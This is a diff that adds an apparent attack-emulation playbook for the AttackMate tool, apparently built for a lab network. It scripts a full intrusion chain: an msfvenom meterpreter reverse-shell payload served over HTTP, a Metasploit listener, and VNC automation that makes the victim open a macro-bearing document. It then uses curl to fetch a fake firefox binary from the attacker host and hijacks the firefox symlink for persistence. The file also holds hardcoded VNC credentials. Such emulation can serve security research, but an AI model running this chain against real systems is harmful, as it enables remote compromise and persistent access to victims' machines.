@@ -1,0 +1,164 @@
+# Client opens an Open Office Document with a macro that download and executes payload
+# persistence via browser binary
+
+vars:
+  PAYLOAD: linux/x64/meterpreter/reverse_tcp
+  LPORT: 4443
+  ATTACKMATE_IP: 192.42.1.174
+  CLIENT_IP: 192.168.50.100
+  MGMT_IP: 192.42.0.201
+  MGMT_USERNAME: aecid
+  CLIENT_VNC_PORT: 5900
+  CLIENT_VNC_USER: judy
+  CLIENT_VNC_PASSWORD: garland
+  ATTACKER_VNC_PORT: 5901
+  RUSTDESK_PACKAGE: https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.deb
+
+
+commands:
+  # establish ssh tunneling via mgmt host, everything sent to attacker port 5902 will be forwarded to client port 5901 (vnc)
+  # ssh -i /home/aecid/.ssh/attacker -o StrictHostKeyChecking=no -L 5902:192.168.50.100:5901 aecid@192.42.0.201
+
+
+##################### SSH TUNNEL VIA MGMT HOST ############################
+
+  - type: shell
+    interactive: true
+    creates_session: tunnel
+    cmd: "ssh -i /home/aecid/.ssh/attacker  -o StrictHostKeyChecking=no -L 5902:$CLIENT_IP:$CLIENT_VNC_PORT $MGMT_USERNAME@$MGMT_IP \n"
+
+################### SERVE THE FAKE EXECUTABLE ############################
+
+  # serve payload via http
+  - type: webserv
+    local_path: /home/aecid/firefox-startup
+    port: 8082
+    background: True
+
+  - type: sleep
+    seconds: 3
+
+################### SERVE THE METERPRETER PAYLOAD ############################
+
+
+  # tempfile for reverse shell payload
+  - type: mktemp
+    cmd: file
+    variable: RSHELL
+  
+  # generate reverse shell
+  - type: shell
+    cmd: msfvenom -p $PAYLOAD LHOST=$ATTACKMATE_IP LPORT=$LPORT -f elf > ${RSHELL}
+  
+  # serve payload via http
+  - type: webserv
+    local_path: $RSHELL
+    port: 8080
+    background: True
+
+  # prepare reverse-shell-listener
+  - type: msf-module
+    creates_session: revshell
+    cmd: exploit/multi/handler
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKMATE_IP
+      LPORT: $LPORT
+    background: true
+    kill_on_exit: true
+
+################### CLIENT OPENS DOCUMENT ############################
+
+  - type: vnc
+    cmd: capture
+    filename: initial_screenshot.png
+    hostname: localhost
+    port: 5902
+    creates_session: client
+
+# Opening a terminal from the menu
+
+  - type: vnc
+    cmd: move
+    x: 5
+    y: 5
+    session: client
+
+  - type: vnc
+    cmd: click
+    session: client
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: type
+    input: "terminal"
+    session: client
+    
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: client
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc 
+    cmd: type 
+    input: "soffice /home/judy/Nutzungshinweise.odt"
+    session: client
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: client
+
+################### ATTACKER INTERACTS WITH METERPRETER ############################
+  # run commands via reverse shell
+  - type: msf-session
+    stdapi: true
+    session: revshell
+    cmd: sysinfo
+
+  - type: sleep
+    seconds: 10
+
+################### PERSISTENCE OPTION A, BROWSER BINARY ############################
+
+  # create a testfile
+  - type: msf-session
+    session: revshell
+    cmd: execute -f /bin/touch -a "/home/judy/testfile"
+
+  # download fake firefox executable
+  - type: msf-session
+    session: revshell
+    cmd: execute -f /usr/bin/curl -a "-o /home/judy/.local/share/firefox/firefox-startup http://192.42.1.174:8082/index"
+
+  - type: sleep
+    seconds: 3
+
+  # make it executable
+  - type: msf-session
+    session: revshell
+    cmd: execute -f /bin/chmod -a "+x /home/judy/.local/share/firefox/firefox-startup"
+
+  # replace the symlink
+  - type: msf-session
+    session: revshell
+    cmd: execute -f /usr/bin/ln -a "-sf /home/judy/.local/share/firefox/firefox-startup /home/judy/.local/bin/firefox"
+
+################### ATTACKER GATHERS INFORMATION ############################
+
+  - type: msf-session
+    session: revshell
+    cmd: sysinfo
+
+    ## TODO 
